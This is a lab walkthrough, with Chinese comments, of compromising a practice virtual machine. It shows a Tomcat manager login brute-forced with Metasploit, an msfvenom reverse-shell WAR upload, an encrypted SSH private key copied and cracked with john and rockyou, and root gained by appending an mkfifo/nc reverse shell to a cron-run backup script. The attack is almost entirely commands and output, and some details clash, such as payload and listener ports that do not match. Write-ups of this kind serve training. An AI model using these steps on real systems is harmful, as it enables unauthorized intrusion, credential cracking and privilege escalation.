#IP
192.168.1.36

nmap -sS -P0 -A 192.168.1.36
# Not shown: 998 closed tcp ports (reset)
# PORT     STATE SERVICE VERSION
# 22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
# | ssh-hostkey: 
# |   2048 8c19ab9172a571d86d751d8f65dfe132 (RSA)
# |   256 906ea0eed5296cb97b05dbc6825c19bf (ECDSA)
# |_  256 544d7be8f97f21343eed0fd9fe93bf00 (ED25519)
# 8080/tcp open  http    Apache Tomcat 9.0.52
# |_http-title: Apache Tomcat/9.0.52
# |_http-favicon: Apache Tomcat
# MAC Address: 08:00:27:3E:29:96 (Oracle VirtualBox virtual NIC)
# Device type: general purpose
# Running: Linux 4.X|5.X
# OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
# OS details: Linux 4.15 - 5.6
# Network Distance: 1 hop
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

dirsearch -u http://192.168.1.36:8080
# [21:04:33] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
# [21:04:34] 400 -  795B  - /a%5c.aspx                                        
# [21:04:44] 200 -   15KB - /docs/                                            
# [21:04:44] 302 -    0B  - /docs  ->  /docs/                                 
# [21:04:45] 302 -    0B  - /examples  ->  /examples/                         
# [21:04:45] 200 -    1KB - /examples/                                        
# [21:04:45] 200 -  946B  - /examples/servlets/servlet/RequestHeaderExample   
# [21:04:45] 200 -    6KB - /examples/servlets/index.html                     
# [21:04:45] 200 -  658B  - /examples/servlets/servlet/CookieExample
# [21:04:45] 200 -   21KB - /favicon.ico                                      
# [21:04:46] 200 -  677B  - /examples/jsp/snp/snoop.jsp                       
# [21:04:46] 401 -    2KB - /host-manager/html                                
# [21:04:47] 302 -    0B  - /host-manager/  ->  /host-manager/html            
# [21:04:47] 200 -   11KB - /index.jsp                                        
# [21:04:50] 302 -    0B  - /manager  ->  /manager/                           
# [21:04:50] 401 -    2KB - /manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY
# [21:04:50] 401 -    2KB - /manager/html
# [21:04:50] 401 -    2KB - /manager/jmxproxy/?qry=STUFF
# [21:04:50] 401 -    2KB - /manager/status/all
# [21:04:50] 401 -    2KB - /manager/html/
# [21:04:50] 401 -    2KB - /manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage
# [21:04:50] 401 -    2KB - /manager/jmxproxy
# [21:04:50] 401 -    2KB - /manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE
# [21:04:50] 401 -    2KB - /manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage&key=used
# [21:04:50] 401 -    2KB - /manager/jmxproxy/?set=Catalina%3Atype%3DValve%2Cname%3DErrorReportValve%2Chost%3Dlocalhost&att=debug&val=cow                                                                                                 
# [21:04:50] 401 -    2KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=
# [21:04:50] 401 -    2KB - /manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS
# [21:04:50] 302 -    0B  - /manager/  ->  /manager/html                      
# [21:04:56] 302 -    0B  - /shell  ->  /shell/

#metasploit 爆破
# [+] 192.168.1.36:8080 - Login Successful: tomcat:role1
tomcat:role1
#登录成功

#查找文件上传点，点击服务器状态，上传war文件
部署war文件 这一栏

#msfvenom 生成反向 shell
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9001 -f war -o shell.war

#kali攻击机，监听
nc -lvnp 4444

#上传war文件，成功以后,访问 war ，执行代码，反弹shell
http://192.168.1.36/reverse/

#反弹shell成功
connect to [192.168.1.15] from (UNKNOWN) [192.168.1.36] 35260

提权到普通用户 thales:
# id
uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)

# uname -a
Linux miletus 4.15.0-159-generic #167-Ubuntu SMP Tue Sep 21 08:55:05 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

#查看用户目录，发现 thales 的私钥文件
# -----BEGIN RSA PRIVATE KEY-----
# Proc-Type: 4,ENCRYPTED
# DEK-Info: AES-128-CBC,6103FE9ABCD5EF41F96C07F531922AAF

ZMlKhm2S2Cqbj+k3h8MgQFr6oG4CBKqF1NfT04fJPs1xbXe00aSdS+QgIbSaKWMh
+/ILeS/r8rFUt9isW2QAH7JYEWBgR4Z/9KSMSUd1aEyjxz7FpZj2cL1Erj9wK9ZA
InMmkm7xAKOWKwLTJeMS3GB4X9AX9ef/Ijmxx/cvvIauK5G2jPRyGSazMjK0QcwX
pkwnm4EwXPDiktkwzg15RwIhJdZBbrMj7WW9kt0CF9P754mChdIWzHrxYhCUIfWd
rHbDYTKmfL18LYhHaj9ZklkZjb8li8JIPvnJDcnLsCY+6X1xB9dqbUGGtSHNnHiL
rmrOSfI7RYt9gCgMtFimYRaS7gFuvZE/NmmIUJkH3Ccv1mIj3wT1TCtvREv+eKgf
/nj+3A6ZSQKFdlm22YZBilE4npxGOC03s81Rbvg90cxOhxYGTZMu/jU9ebUT2HAh
o1B972ZAWj3m5sDZRiQ+wTGqwFBFxF9EPia6sRM/tBKaigIElDSyvz1C46mLTmBS
f8KNwx5rNXkNM7dYX1Sykg0RreKO1weYAA0yQSHCY+iJTIf81CuDcgOIYRywHIPU
9rI20K910cLLo+ySa7O4KDcmIL1WCnGbrD4PwupQ68G2YG0ZOOIrwE9efkpwXPCR
Vi2TO2Zut8x6ZEFjz4d3aWIzWtf1IugQrsmBK+akRLBPjQVy/LyApqvV+tYfQelV
v9pEKMxR5f1gFmZpTbZ6HDHmEO4Y7gXvUXphjW5uijYemcyGx0HSqCSER7y7+phA
h0NEJHSBSdMpvoS7oSIxC0qe4QsSwITYtJs5fKuvJejRGpoh1O2HE+etITXlFffm
2J1fdQgPo+qbOVSMGmkITfTBDh1ODG7TZYAq8OLyEh/yiALoZ8T1AEeAJev5hON5
PUUP8cxX4SH43lnsmIDjn8M+nEsMEWVZzvaqo6a2Sfa/SEdxq8ZIM1Nm8fLuS8N2
GCrvRmCd7H+KrMIY2Y4QuTFR1etulbBPbmcCmpsXlj496bE7n5WwILLw3Oe4IbZm
ztB5WYAww6yyheLmgU4WkKMx2sOWDWZ/TSEP0j9esOeh2mOt/7Grrhn3xr8zqnCY
i4utbnsjL4U7QVaa+zWz6PNiShH/LEpuRu2lJWZU8mZ7OyUyx9zoPRWEmz/mhOAb
jRMSyfLNFggfzjswgcbwubUrpX2Gn6XMb+MbTY3CRXYqLaGStxUtcpMdpj4QrFLP
eP/3PGXugeJi8anYMxIMc3cJR03EktX5Cj1TQRCjPWGoatOMh02akMHvVrRKGG1d
/sMTTIDrlYlrEAfQXacjQF0gzqxy7jQaUc0k4Vq5iWggjXNV2zbR/YYFwUzgSjSe
SNZzz4AMwRtlCWxrdoD/exvCeKWuObPlajTI3MaUoxPjOvhQK55XWIcg+ogo9X5x
B8XDQ3qW6QJLFELXpAnl5zW5cAHXAVzCp+VtgQyrPU04gkoOrlrj5u22UU8giTdq
nLypW+J5rGepKGrklOP7dxEBbQiy5XDm/K/22r9y+Lwyl38LDF2va22szGoW/oT+
8eZHEOYASwoSKng9UEhNvX/JpsGig5sAamBgG1sV9phyR2Y9MNb/698hHyULD78C
-----END RSA PRIVATE KEY-----

#kali 本地创建 id_rsa 文件，复制进去
#ssh2john 格式化下文件
ssh2john id_rsa > mycrack.txt

#john 破解密码
john --wordlist=/usr/share/wordlists/rockyou.txt mycrack.txt

#密码破解成功
vodka06          (id_rsa)  

#切换用户 thales
su - thales
#thales@miletus:~$ 

#获得 user flag
a837c0b5d2a8a07225fd9905f5a0e9c4

提权 root:
id
uid=1000(thales) gid=1000(thales) groups=1000(thales),4(adm),24(cdrom),27(sudo),
30(dip),46(plugdev),108(lxd)

#查看 notes.txt
/usr/local/bin/backup.sh
# I prepared a backup script for you. The script is in this directory "/usr/local/bin/backup.sh". 
# Good Luck.

查看backup.sh脚本
#!/bin/bash
####################################
#
# Backup to NFS mount script.
#
####################################
# What to backup. 
backup_files="/opt/tomcat/"
# Where to backup to.
dest="/var/backups"
# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"
# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo
# Backup the files using tar.
tar czf $dest/$archive_file $backup_files
# Print end status message.
echo
echo "Backup finished"
date
# Long listing of files in $dest to check file sizes.
ls -lh $dest

#将 反向shell 写入 backup.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.15 4445 >/tmp/f" >> backup.sh

#这里不用执行 backup 脚本，自动执行的

#kali攻击机  监听 4445端口，需要等待 30秒左右
nc -lvnp 4445                          
# listening on [any] 4445 ...

需要等待 30秒左右
# connect to [192.168.1.15] from (UNKNOWN) [192.168.1.36] 41670
# /bin/sh: 0: can't access tty; job control turned off

# id
uid=0(root) gid=0(root) groups=0(root)

#获得root flag
3a1c85bebf8833b0ecae900fb8598b17

#全部完成
























